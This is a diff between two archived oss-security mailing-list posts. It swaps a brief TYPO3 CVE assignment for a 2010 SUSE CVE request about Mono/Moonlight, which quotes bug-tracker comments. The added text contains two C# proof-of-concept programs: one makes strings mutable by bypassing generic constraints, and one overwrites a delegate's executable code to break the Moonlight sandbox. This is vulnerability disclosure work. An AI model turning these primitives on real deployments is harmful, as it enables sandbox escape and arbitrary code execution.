@@ -1,22 +1,138 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/01/19/3
-Message-ID: <356068407.218351263929152484.JavaMail.root@zmail01.collab.prod.int.phx2.redhat.com>
-Date: Tue, 19 Jan 2010 14:25:52 -0500 (EST)
-From: Josh Bressers <bressers@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2010/11/25/4
+Message-Id: <201011251552.17678.thomas@suse.de>
+Date: Thu, 25 Nov 2010 15:52:17 +0100
+From: Thomas Biege <thomas@...e.de>
 To: oss-security@...ts.openwall.com
-Subject: Re: CVE request: typo3 < 4.3.1 openid authentication bypass
+Subject: CVE request: mono/moonlight: execution of arbitrary code due to mutable Strings
 Content-Type: text/plain; charset=utf-8
 
+Hello.
 
------ "Hanno Böck" <hanno@...eck.de> wrote:
+Just a copy-n-paste from our bugzilla (again):
 
-> See here:
-> http://typo3.org/teams/security/security-bulletins/typo3-sa-2010-001/
-> 
+------------------------------------------------------------------------------
+SP 2010-11-24 20:45:21 UTC
 
-Please use CVE-2010-0286
+Original (pulled by author) blog entry:
 
-Thanks.
+So I was messing around with generic methods and discovered that generic
+constraints can be bypassed on Mono 2.6.7 and 2.8 using reflection (with the
+exception of the new() constraint). One of the fun results of this bug is that
+the String class can be made mutable without using reflection to set private
+members!
+
+The following code demonstrates this; it is legal and will run on Mono up to
+and including version 2.8:
+
+using System;
+using System.Reflection;
+
+public class FakeString {
+    public int length;
+    public char start_char;
+}
+
+public class TestCase {
+    private static FakeString UnsafeConversion<T>(T thing)
+        where T : FakeString
+    {
+        return thing;
+    }
+
+    public static void Main() {
+        var a = "foo";
+        var b = MakeMutable(a);
+
+        Console.WriteLine(a);
+        b.start_char = 'b';
+        Console.WriteLine(a);
+    }
+
+    private static FakeString MakeMutable(string s)
+    {
+        var m = typeof(TestCase).GetMethod("UnsafeConversion",
+BindingFlags.NonPublic | BindingFlags.Static);
+        var m2 = m.MakeGenericMethod(typeof(string));
+
+        var d = (Func<string,
+FakeString>)Delegate.CreateDelegate(typeof(Func<string, FakeString>), null,
+m2);
+
+        return d(s);
+    }
+}
+
+
+
+Comment 1 SP 2010-11-24 20:54:20 UTC
+
+This is a follow up of the previous
+https://bugzilla.novell.com/show_bug.cgi?id=654136
+
+The original blog entry allow trusted (by moonlight) code to mutate strings
+which could be used to trick policies (e.g. give a valid URL and, once 
+accepted
+as a valid xdomain URL, change it to something else).
+
+It can also be extended to arbitrary code execution. POC by Geoff Norton: 
+
+using System;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+public class DelegateWrapper {
+    public IntPtr method_ptr;
+}
+
+public delegate void MethodWrapper ();
+
+public class BreakSandbox {
+    private static DelegateWrapper Convert <T> (T dingus) where T :
+DelegateWrapper {
+        return dingus;
+    }
+
+    private static DelegateWrapper ConvertDelegate (Delegate del) {
+        var m = typeof (BreakSandbox).GetMethod ("Convert",
+BindingFlags.NonPublic | BindingFlags.Static);
+        var gm = m.MakeGenericMethod (typeof (Delegate));
+
+        var d = (Func <Delegate, DelegateWrapper>) Delegate.CreateDelegate
+(typeof (Func <Delegate, DelegateWrapper>), null, gm);
+
+        return d (del);
+    }
+
+    public static void Main (string [] args) {
+        MethodWrapper d = delegate {
+            Console.WriteLine ("Hello");
+        };
+
+        d ();
+        var converted = ConvertDelegate (d);
+        // Overwrite the already WX page with a 'ret'
+        Marshal.WriteByte (converted.method_ptr, (byte) 0xc3);
+        d ();
+    }
+}
+
+This code won't execute on Moonlight (since all Marshal.* code is
+SecurityCritical) but it would not be hard to modify the POC to do the same
+without SecurityCritical code.
+
+Note: the bug is present in Mono but does not represent a security
+vulnerability there since Mono (unlike Moonlight) can only execute trusted
+code.
+
+[reply] [-]
+Private
+Comment 2 
+------------------------------------------------------------------------------
 
 -- 
-    JB
+ Thomas Biege <thomas@...e.de>, SUSE LINUX, Security Support & Auditing
+ SUSE LINUX Products GmbH, GF: Markus Rex, HRB 16746 (AG Nuernberg)
+--
+  Wer aufhoert besser werden zu wollen, hoert auf gut zu sein.
+                            -- Marie von Ebner-Eschenbach
